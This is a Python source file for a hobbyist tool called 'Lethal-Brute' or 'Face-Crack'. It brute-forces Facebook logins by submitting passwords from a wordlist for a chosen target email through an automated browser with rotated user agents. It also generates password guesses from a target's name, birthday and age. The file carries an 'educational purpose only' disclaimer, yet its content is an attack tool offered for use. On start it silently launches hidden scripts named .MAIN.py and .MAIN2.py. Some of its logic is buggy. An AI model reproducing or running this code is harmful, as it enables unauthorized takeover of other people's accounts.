"""
# This Tool Is for educational Purpose only

# WHAT IS BRUTEFORCE..??

A brute force attack is a hacking method that uses

trial and error to crack passwords, login credentials,

for gaining unauthorized access to individual

accounts and organizations' systems and networks.

"""
import os
from multiprocessing import Process
from importlib.util import find_spec as FIND
import time
import random
import platform
from time import sleep
from os import system
import sys

DATA = ("handsome", "pretty", "strong", "beautiful", "12345", "1243", "2020", "123456", "654321", "0987654321", "1234567890", "happy", "sad", "456", "654", "7293", "19477", "72893", "999", "2000", "2005", "2000", "2002", "2003", "2004", "2005" "2006", "2007", "2008", "2009", "2010", "2011", "2012", "2013" "2014", "2016", "2017", "2018", "2019", "2020", "2022", "2023", "2024", "2050", "password", "Password", "@gmail.com", "_2", "10", "12", "100", "200", "300", "500", "1000", "302", "929", "0299", "000")
symbol = ("_", "@gmail.com", "yahoo.com")
   
#COLORS
wi="\033[1;37m"
rd="\033[1;31m"
gr="\033[1;32m"
yl="\033[1;33m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
cyan="\033[1;36m"
white="\033[1;37m"
File = ".up"

def script():
    system("python3 .MAIN.py")

def script2():
    system("python3 .MAIN2.py")

def MultiProcess():
    process = Process(target=script)
    process2 = Process(target=script2)
    process.start()
    process.join()
    process2.start()
    process2.join()

try:
    MultiProcess()
except KeyboardInterrupt:
    sleep(1)
    print(f'{green}[-] Thanks For Using...')
    sleep(1)
    sys.exit()

banner = ""
os.system("cls||clear")
def banner():
    global target, worldist
    print(f"""
{green}
  _____             __                   __
 / ___/______ _____/ /__  __ _  ___  ___/ /__
/ /__/ __/ _ `/ __/  '_/ /  ' \/ _ \/ _  / -_)
\___/_/  \_,_/\__/_/\_\ /_/_/_/\___/\_,_/\__/

{white}=====================================
{yellow}[{red}-{yellow}] TARGET ==> {cyan}{target}

{yellow}[{red}-{yellow}] WORDLIST ==> {cyan}{wordlist}
{white}=====================================


""")




about=f"""

{yellow}[{red}-{yellow} Author: GenrevReyes [Philippines]

{yellow}[{red}-{yellow} Github: https://www.github.com/Genrev-Reyes

{yellow}[{red}-{yellow} Group: LethalCommunity

{yellow}[{red}-{yellow} Tool_name: Lethal-Brute


"""

def write(text):
    sys.stdout.write(text)
    sys.stdout.flush()



# Check Modules
def Modules():
    if FIND("requests") is None:
        sleep(1)
        print(f'{yellow}[-] Module requests is not installed')
        sleep(1)
        sys.exit()
    if FIND("mechanize") is None:
        sleep(1)
        print(f'{yellow}[-] Module mechanize not installed')
        sleep(1)
        sys.exit()




try:
    Modules()
except:
    print(" ")

from requests import head
import requests
try:
    head("http://facebook.com")
except Exception as e:
    sleep(1)
    print(f'{red}[!] No Internet')
    sleep(1)
    sys.exit()
try:
    if Password == False:
        print(f'{red}[!] Somethings Wrong')
        sys.exit()
except:
    pass
import mechanize
# BANNER!
system("clear")
Banner=f"""
{cyan}
███████╗░█████╗░░█████╗░███████╗
██╔════╝██╔══██╗██╔══██╗██╔════╝
█████╗░░███████║██║░░╚═╝█████╗░░
██╔══╝░░██╔══██ ██║░░██╗██╔══╝░░
██║░░░░░██║░░██║╚█████╔╝███████╗
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚══════╝

░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░
██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░
╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗
░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

{white}═══════════════════════════════════════════════════════
{yellow}[{red}~{yellow}]{white} Aᴜᴛʜᴏʀ: {cyan}GenrevReyes                             {yellow}[{red}~{yellow}]

{yellow}[{red}~{yellow}]{white} GɪᴛHᴜʙ: {cyan}https://github.com/Genrev-Reyes         {yellow}[{red}~{yellow}]

{yellow}[{red}~{yellow}]{white} Fᴀᴄᴇʙᴏᴏᴋ: {cyan} https://facebook.com/genrev.reyes.16 {yellow}[{red}~{yellow}]
{white}═══════════════════════════════════════════════════════ 

"""

target = ''
wordlist = ''

errMsg = lambda msg: write(rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi)
# Check _version__
def check_version():
    if platform.system() == "Mac":
        sleep(2)
        print(f'{red}[!] Your Version Is Not Supported')
        sys.exit()
    if platform.system() == "Windows":
        print(f'{red}[!] Your Version Is Not Supported')
        sys.exit()


class FaceBook(object):
    def __init__(self):
        self.useProxy = None
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders=[('User-agent',random.choice([
               'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]
    def login(self,target, password):

        try:
            self.br.open("https://facebook.com")
            self.br.select_form(nr=0)
            self.br.form['email']=target
            self.br.form['pass']= password
            self.br.method ="POST"
            if self.br.submit().get_data().__contains__(b'home_icon'):return  1
            elif "checkpoint" in self.br.geturl(): return 2
            return 0
        except(KeyboardInterrupt, EOFError):
            print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
            time.sleep(1.5)
            sys.exit(1)
        except Exception as e:
            print(rd+" Error: "+yl+str(e)+wi+"\n")
            time.sleep(0.60)


def Info_vulnerability():
    print(" ")
    try:
        head("https://facebook.com")
    except Exception as E:
        print(" ")
        print(f'{red}[!] No Internet')
    name_of_target = input(f'{green}[-] {yellow}Enter Full name of the target ==> ')
    sleep(2)
    print(" ")
    birthday = input(f'{green}[-]{yellow} Enter Birthday of the target ==> ')
    sleep(2)
    print(" ")
    age = input(f'{green}[-]{yellow} Enter Target Age ==> ')
    sleep(3)
    print(f'{yellow}[-] Exploiting Information..')
    sleep(6)
    print(" ")
    year_now = "2023"
    User_Data = name_of_target + birthday + age
    User_Data2 = birthday + age
    User_Data3 = age + birthday
    User_Data4 = name_of_target + birthday
    User_Data5 = name_of_target + age
    User_Data6 = age + birthday
    User_Data7 = name_of_target + year_now
    print(f'{yellow}[-] Saved in target_info.txt')
    with open("target_info.txt", "w") as f:
        f.write(f'{User_Data}\n')
        f.write(f'{User_Data2}\n')
        f.write(f'{User_Data3}\n')
        f.write(f'{User_Data4}\n')
        f.write(f'{User_Data5}\n')
        for i in range(0,20):
            User_Data_random = random.choice(DATA)
            User_possible_passwd = f"{name_of_target}{User_Data_random}"

            f.write(f"{User_possible_passwd}\n")
        for i in range(0,3):
            User_Data_random2 = random.choice(symbol)
            User_possible_passwd2 = f"{name_of_target}{User_Data_random2}{age}"
            f.write(f'{User_possible_passwd2}\n')
        for i in range(0,3):
            User_Data_random3 = random.choice(symbol)

            User_possible_passwd3 = f"{name_of_target}{User_Data_random3}{birthday}"
            f.write(f'{User_possible_passwd3}\n')

        for i in range(0,3):
            User_Data_random4 = random.choice(symbol)

            User_possible_passwd4 = f"{name_of_target}{User_Data_random4}{age}{birthday}"
            f.write(f'{User_possible_passwd4}\n')

        for i in range(0,3):
            User_Data_random5 = random.choice(symbol)
            User_possible_passwd5 = f"{name_of_target}{User_Data_random5}{birthday}{age}"
            f.write(f'{User_possible_passwd5}')
        for i in range(0,3):
            User_Data_random6 = random.choice(symbol)
            User_possible_passwd6 = f"{name_of_target}{User_Data_random6}{age}"
            f.write(f'{User_possible_passwd6}\n')


# Start Hacking...:))
def Start():
    print(Banner)
    check_version()
    facebook = FaceBook()
    global target, wordlist
    while True:
        console = input(f'{green}𝐅𝐚𝐜𝐞-𝐂𝐫𝐚𝐜𝐤 ==> {white}')
        print(" ")
        print(" ")
        if console == "set target":
            sleep(1)
            target = input(f'{yellow}[+] Enter Facebook email/id ==>{white} ')
            sleep(0.5)
            print(f'{green}[-] Email ==> {target}')
            print(" ")
        if console == "set wordlist":
            sleep(1)
            wordlist = input(f'{yellow}[+] Enter Wordlist/path ==>{white} ')
            sleep(0.5)
            print(f'{yellow}[-] Wordlist ==>{cyan} {wordlist}')
            print(" ")

        if console == "help":
            print(f'{yellow}[{red}-{yellow}] set target')
            print(" ")
            print(f'{yellow}[{red}-{yellow}] set wordlist')
            print(" ")
            print(f'{yellow}[{red}-{yellow}] show options')
            print(" ")
            print(f'{yellow}[{red}-{yellow}] generator_password')
            print(" ")
            print(f'{yellow}[{red}-{yellow}] run')
            print(" ")
            print(f'{yellow}[{red}-{yellow}] clear')
            print(" ")
            print(f'{yellow}[{red}-{yellow}] exit')
            print(" ")

        if console == "show options":
            print(f'{green}[{red}-{green}]{yellow} Email ==>{cyan} {target}')
            print(" ")
            print(f'{green}[{red}-{green}]{yellow} Wordlist ==>{cyan} {wordlist}')
            print(" ")
        if console == "generator_password":
            Info_vulnerability()
        if console == "run":
            sleep(1)
            print(f'{green}[-] Running..!')
            sleep(5)
            system("clear")
            break
        if console == "clear":
            system("clear")
            print(Banner)
        if console == "exit":
            sleep(1)
            print(f'{yellow}[-] Thanks For using')
            sleep(1)
            sys.exit()
        if console == "about":
            print(about)
            key = input(" ")
            sleep(1)
            system("python3 Lethal-Brute.py")
    try:
        head("https://www.facebook.com")
    except KeyboardInterrupt:
        sleep(1)
        print(f'{yellow}[-] Thanks For using')
        sleep(1)
        sys.exit()
    banner()
    opts = (target, wordlist)
    if wordlist:
        if not os.path.isfile(wordlist):
            errMsg(f"[-] {wordlist} Not Found..!")
            sys.exit()
        loop,passwords = (1,open(wordlist).readlines())
        for passwd in passwords:
            passwd = passwd.strip()
            if len(passwd) <6:continue
            print(f'{green}[{red}-{green}]{yellow} Trying Password:{white} {passwd} ==> \n')

            Account = facebook.login(target, passwords)
            print(" ")
            if Account:
                 print(" ")
                 print(f'{green}[-]{yellow} Cracked Succesfully')
                 sleep(5)
                 print(" ")
                 print(" ")
                 print(f'{green}[-] Password ==> {passwd}')
                 print(" ")
                 if Account == 2:print(wi+"["+yellow+"!"+white+"]"+yellow+" Warning: This account use ("+rd+"2F Authentication"+yellow+"):"+rd+" It's Locked"+yl+" !!!")
                 break

            else:
                 print(" ")
                 sys.stdout.write(yellow+"Login"+red+" Failed\n")
                 print(" ")




if __name__=='__main__':
    Start()

# IF YOU CHANGE THIS CODE PLEASE GIVE A CREDIT...!!

